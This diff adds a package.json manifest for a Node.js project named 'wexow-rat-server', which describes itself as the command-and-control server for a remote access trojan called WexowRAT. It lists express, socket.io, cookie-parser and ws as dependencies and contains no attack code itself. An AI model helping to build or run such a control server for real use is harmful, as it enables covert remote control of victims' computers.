@@ -1,0 +1,15 @@
+{
+  "name": "wexow-rat-server",
+  "version": "1.0.0",
+  "description": "C2 Server for WexowRAT",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "express": "^4.17.1",
+    "socket.io": "^4.0.1",
+    "cookie-parser": "^1.4.6",
+    "ws": "^8.18.0"
+  }
+}
